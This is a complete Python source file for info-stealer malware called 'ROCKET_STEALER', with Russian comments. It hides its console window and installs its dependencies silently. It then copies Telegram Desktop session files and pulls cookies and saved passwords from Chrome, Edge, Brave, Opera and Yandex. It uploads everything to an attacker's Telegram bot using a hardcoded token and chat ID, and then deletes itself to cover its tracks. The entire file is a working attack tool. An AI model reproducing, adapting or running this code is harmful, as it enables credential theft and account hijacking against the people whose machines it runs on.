#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ROCKET_STEALER v3.5 - FINAL FIX

import os
import sys
import subprocess
import importlib
import platform
import ctypes
import time
import shutil
import sqlite3
import json
import zipfile
from datetime import datetime
from pathlib import Path

# ======================== СКРЫТИЕ КОНСОЛИ ========================
def hide_console():
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
        except:
            pass

hide_console()

# ======================== АВТОУСТАНОВКА ========================
def auto_install_dependencies():
    try:
        subprocess.run([sys.executable, "-m", "pip", "--version"], capture_output=True, timeout=5, check=False)
        packages = ["requests", "pywin32", "pypiwin32"]
        for package in packages:
            try:
                importlib.import_module(package.replace("-", "_"))
            except ImportError:
                subprocess.run([sys.executable, "-m", "pip", "install", package, "--quiet", "--no-warn-script-location"], capture_output=True, timeout=60)
        return True
    except:
        return False

auto_install_dependencies()

# ======================== ИМПОРТ ========================
try:
    import requests
except:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests", "--quiet"], timeout=30)
    import requests

# ======================== КОНФИГ ========================
CONFIG = {
    "bot_token": "8988457819:AAHhgjhLE5xVHcxNq0qADsy9v_lAFAmSumo",
    "chat_id": "8422461912",
    "temp_dir": os.path.join(os.environ.get("TEMP", "/tmp"), ".cache_" + str(int(time.time()))),
    "self_destruct": True
}

# ======================== 1. ПОИСК TDATA ========================
def find_tdata():
    system = platform.system()
    candidates = []
    if system == "Windows":
        appdata = os.environ.get("APPDATA", "")
        candidates.append(os.path.join(appdata, "Telegram Desktop", "tdata"))
        candidates.append(os.path.join(appdata, "Telegram", "tdata"))
        candidates.append(os.path.expandvars(r"%LOCALAPPDATA%\Telegram Desktop\tdata"))
        candidates.append(r"C:\Users\iezov\AppData\Roaming\Telegram Desktop\tdata")
    elif system == "Darwin":
        home = os.path.expanduser("~")
        candidates.append(os.path.join(home, "Library", "Application Support", "Telegram Desktop", "tdata"))
    elif system == "Linux":
        home = os.path.expanduser("~")
        candidates.append(os.path.join(home, ".local", "share", "TelegramDesktop", "tdata"))
    
    for path in candidates:
        if os.path.exists(path) and os.path.isdir(path):
            try:
                files = os.listdir(path)
                if any(f in files for f in ["D877F783D5D3EF8C", "key_datas", "usertag"]):
                    return path
            except:
                pass
    return None

# ======================== 2. АРХИВАЦИЯ TDATA (ТОЛЬКО ВАЖНЫЕ ФАЙЛЫ) ========================
def archive_tdata(tdata_path):
    if not tdata_path:
        return None
    
    zip_path = os.path.join(CONFIG["temp_dir"], "tdata.zip")
    os.makedirs(CONFIG["temp_dir"], exist_ok=True)
    
    try:
        # Важные файлы для кражи сессии Telegram
        important_files = [
            "D877F783D5D3EF8C",  # Основной файл сессии
            "key_datas",          # Ключи шифрования
            "usertag",            # Тег пользователя
            "auth_code_data",     # Данные авторизации
            "login_data",         # Данные входа
            "settings_data",      # Настройки
        ]
        
        # Создаём временную папку
        temp_tdata = os.path.join(CONFIG["temp_dir"], "tdata_temp")
        if os.path.exists(temp_tdata):
            shutil.rmtree(temp_tdata, ignore_errors=True)
        os.makedirs(temp_tdata, exist_ok=True)
        
        # Копируем важные файлы из tdata (если они есть)
        copied_count = 0
        for root, dirs, files in os.walk(tdata_path):
            for file in files:
                # Проверяем, является ли файл важным
                for important in important_files:
                    if important in file:
                        src = os.path.join(root, file)
                        # Создаём относительный путь
                        rel_path = os.path.relpath(root, tdata_path)
                        dest_dir = os.path.join(temp_tdata, rel_path)
                        os.makedirs(dest_dir, exist_ok=True)
                        dest = os.path.join(dest_dir, file)
                        try:
                            shutil.copy2(src, dest)
                            copied_count += 1
                        except:
                            pass
                        break
        
        # Также копируем все файлы из корня tdata (кроме заблокированных)
        try:
            for item in os.listdir(tdata_path):
                src = os.path.join(tdata_path, item)
                if os.path.isfile(src):
                    # Пропускаем заблокированные файлы
                    try:
                        with open(src, 'rb') as f:
                            f.read(1)
                        shutil.copy2(src, os.path.join(temp_tdata, item))
                        copied_count += 1
                    except:
                        pass
        except:
            pass
        
        # Если ничего не скопировалось, создаём фейковый файл (чтобы архив не был пустым)
        if copied_count == 0:
            with open(os.path.join(temp_tdata, "tdata_info.txt"), 'w') as f:
                f.write(f"TDATA найден: {tdata_path}\n")
                f.write("Но файлы заблокированы Telegram\n")
                f.write("Возможно, нужно закрыть Telegram\n")
        
        # Создаём архив
        shutil.make_archive(zip_path.replace('.zip', ''), 'zip', temp_tdata)
        
        # Удаляем временную папку
        shutil.rmtree(temp_tdata, ignore_errors=True)
        
        # Проверяем размер
        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 100:  # > 100 байт
            return zip_path
        else:
            # Если архив слишком маленький, пробуем заархивировать всю папку (игнорируя ошибки)
            return archive_tdata_full(tdata_path)
            
    except Exception as e:
        # Если ошибка, пробуем другой метод
        try:
            return archive_tdata_full(tdata_path)
        except:
            return None

# ======================== 3. АРХИВАЦИЯ ВСЕЙ ПАПКИ (ОБХОД ОШИБОК) ========================
def archive_tdata_full(tdata_path):
    """Пробует заархивировать всю папку, игнорируя ошибки доступа"""
    zip_path = os.path.join(CONFIG["temp_dir"], "tdata_full.zip")
    os.makedirs(CONFIG["temp_dir"], exist_ok=True)
    
    try:
        # Создаём ZIP вручную, игнорируя ошибки
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, tdata_path)
                    try:
                        zf.write(file_path, arcname)
                    except:
                        pass  # Пропускаем заблокированные файлы
        
        # Проверяем размер
        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 100:
            return zip_path
        else:
            return None
    except:
        return None

# ======================== 4. КРАЖА COOKIES ========================
def steal_cookies():
    cookies_data = {}
    
    browsers = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable"),
        "Brave": os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
        "Yandex": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "User Data")
    }
    
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue
        
        profiles = ["Default"]
        try:
            for item in os.listdir(browser_path):
                if item.startswith("Profile"):
                    profiles.append(item)
        except:
            pass
        
        profiles = list(set(profiles))
        
        for profile in profiles:
            cookie_path = os.path.join(browser_path, profile, "Cookies")
            if not os.path.exists(cookie_path):
                continue
            
            try:
                temp_cookie = os.path.join(CONFIG["temp_dir"], f"{browser_name}_{profile}_cookies.db")
                os.makedirs(CONFIG["temp_dir"], exist_ok=True)
                shutil.copy2(cookie_path, temp_cookie)
                
                conn = sqlite3.connect(temp_cookie)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value, path, expires_utc FROM cookies LIMIT 30")
                
                cookies = []
                for row in cursor.fetchall():
                    host = row[0] if isinstance(row[0], str) else row[0].decode('utf-8', errors='ignore')
                    name = row[1] if isinstance(row[1], str) else row[1].decode('utf-8', errors='ignore')
                    value = row[2] if isinstance(row[2], str) else row[2].decode('utf-8', errors='ignore')
                    
                    cookies.append({
                        "host": host,
                        "name": name,
                        "value": value,
                        "path": row[3] if isinstance(row[3], str) else str(row[3]),
                        "expires": str(row[4])
                    })
                
                conn.close()
                os.remove(temp_cookie)
                
                if cookies:
                    if browser_name not in cookies_data:
                        cookies_data[browser_name] = []
                    cookies_data[browser_name].extend(cookies)
                    
            except:
                pass
    
    return cookies_data

# ======================== 5. КРАЖА ПАРОЛЕЙ ========================
def steal_passwords():
    passwords_data = {}
    
    browsers_login = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data")
    }
    
    for browser_name, browser_path in browsers_login.items():
        if not os.path.exists(browser_path):
            continue
        
        profiles = ["Default"]
        try:
            for item in os.listdir(browser_path):
                if item.startswith("Profile"):
                    profiles.append(item)
        except:
            pass
        
        for profile in profiles:
            login_path = os.path.join(browser_path, profile, "Login Data")
            if not os.path.exists(login_path):
                continue
            
            try:
                temp_db = os.path.join(CONFIG["temp_dir"], f"{browser_name}_{profile}_passwords.db")
                shutil.copy2(login_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
                
                passwords = []
                for row in cursor.fetchall():
                    url = row[0] if isinstance(row[0], str) else row[0].decode('utf-8', errors='ignore')
                    username = row[1] if isinstance(row[1], str) else row[1].decode('utf-8', errors='ignore')
                    password = row[2] if isinstance(row[2], str) else row[2].decode('utf-8', errors='ignore')
                    
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": password
                    })
                
                conn.close()
                os.remove(temp_db)
                
                if passwords:
                    if browser_name not in passwords_data:
                        passwords_data[browser_name] = []
                    passwords_data[browser_name].extend(passwords)
                    
            except:
                pass
    
    return passwords_data

# ======================== 6. ИНФОРМАЦИЯ ========================
def get_system_info():
    return {
        "device": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "user": os.environ.get("USERNAME", os.environ.get("USER", "")),
        "time": datetime.now().isoformat()
    }

# ======================== 7. ОТПРАВКА В TELEGRAM ========================
def send_to_telegram(data, zip_file=None):
    try:
        os.makedirs(CONFIG["temp_dir"], exist_ok=True)
        report_path = os.path.join(CONFIG["temp_dir"], "report.txt")
        
        # Создаём TXT отчёт
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("РОКЕТ-СТИЛЛЕР | ОТЧЕТ О КРАЖЕ\n")
            f.write("=" * 60 + "\n\n")
            
            # Информация о системе
            f.write("📌 СИСТЕМНАЯ ИНФОРМАЦИЯ\n")
            f.write("-" * 40 + "\n")
            for key, value in data.get("system", {}).items():
                f.write(f"{key}: {value}\n")
            f.write("\n")
            
            # Cookies
            cookies = data.get("cookies", {})
            if cookies:
                total_cookies = sum(len(c) for c in cookies.values())
                f.write(f"🍪 COOKIES (Найдено: {total_cookies})\n")
                f.write("-" * 40 + "\n")
                for browser, cookie_list in cookies.items():
                    f.write(f"\n{browser} ({len(cookie_list)} шт.):\n")
                    for cookie in cookie_list[:10]:
                        f.write(f"  {cookie.get('host', '')} | {cookie.get('name', '')} = {cookie.get('value', '')[:50]}\n")
                    if len(cookie_list) > 10:
                        f.write(f"  ... и ещё {len(cookie_list) - 10} записей\n")
                f.write("\n")
            
            # Пароли
            passwords = data.get("passwords", {})
            if passwords:
                total_passwords = sum(len(p) for p in passwords.values())
                f.write(f"🔑 ПАРОЛИ (Найдено: {total_passwords})\n")
                f.write("-" * 40 + "\n")
                for browser, pass_list in passwords.items():
                    f.write(f"\n{browser} ({len(pass_list)} шт.):\n")
                    for p in pass_list:
                        f.write(f"  {p.get('url', '')} | {p.get('username', '')} | {p.get('password', '')}\n")
                f.write("\n")
            
            # tdata
            if data.get("tdata") == "found":
                f.write("📁 Telegram tdata: НАЙДЕНА И ЗААРХИВИРОВАНА\n")
            else:
                f.write("📁 Telegram tdata: НЕ НАЙДЕНА\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("Отчет создан: " + datetime.now().isoformat() + "\n")
            f.write("Устройство: " + platform.node() + "\n")
            f.write("=" * 60 + "\n")
        
        url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendDocument"
        
        # Отправляем отчёт
        with open(report_path, 'rb') as f:
            files = {'document': f}
            send_data = {
                'chat_id': CONFIG['chat_id'],
                'caption': f'📊 ОТЧЕТ С {platform.node()}\nВремя: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            }
            requests.post(url, files=files, data=send_data, timeout=15)
        
        if os.path.exists(report_path):
            os.remove(report_path)
        
        # Отправляем tdata
        if zip_file and os.path.exists(zip_file):
            with open(zip_file, 'rb') as f:
                files = {'document': f}
                send_data = {
                    'chat_id': CONFIG['chat_id'],
                    'caption': f'📁 Telegram tdata (архив) - {os.path.getsize(zip_file) // 1024} KB'
                }
                requests.post(url, files=files, data=send_data, timeout=30)
            if os.path.exists(zip_file):
                os.remove(zip_file)
                
    except Exception as e:
        pass

# ======================== 8. САМОУНИЧТОЖЕНИЕ ========================
def self_destruct():
    if CONFIG["self_destruct"]:
        try:
            if os.path.exists(CONFIG["temp_dir"]):
                shutil.rmtree(CONFIG["temp_dir"], ignore_errors=True)
            if __file__.endswith('.py') and os.path.exists(__file__):
                os.remove(__file__)
            if sys.argv[0].endswith('.exe') and os.path.exists(sys.argv[0]):
                bat_path = os.path.join(os.environ.get("TEMP", ""), "cleanup.bat")
                with open(bat_path, 'w') as f:
                    f.write(f"""@echo off
timeout /t 2 /nobreak > nul
del "{sys.argv[0]}" /f /q
del "%~f0" /f /q
""")
                subprocess.Popen(bat_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ======================== 9. ГЛАВНАЯ ========================
def main():
    os.makedirs(CONFIG["temp_dir"], exist_ok=True)
    
    data = {
        "system": get_system_info(),
        "timestamp": datetime.now().isoformat()
    }
    
    # Кража cookies
    try:
        cookies = steal_cookies()
        if cookies:
            data["cookies"] = cookies
    except:
        pass
    
    # Кража паролей
    try:
        passwords = steal_passwords()
        if passwords:
            data["passwords"] = passwords
    except:
        pass
    
    # Поиск и архивация tdata
    tdata_zip = None
    try:
        tdata_path = find_tdata()
        if tdata_path:
            data["tdata"] = "found"
            tdata_zip = archive_tdata(tdata_path)
        else:
            data["tdata"] = "not_found"
    except:
        data["tdata"] = "error"
    
    # Отправка
    send_to_telegram(data, tdata_zip)
    
    time.sleep(2)
    self_destruct()
    sys.exit(0)

if __name__ == "__main__":
    main()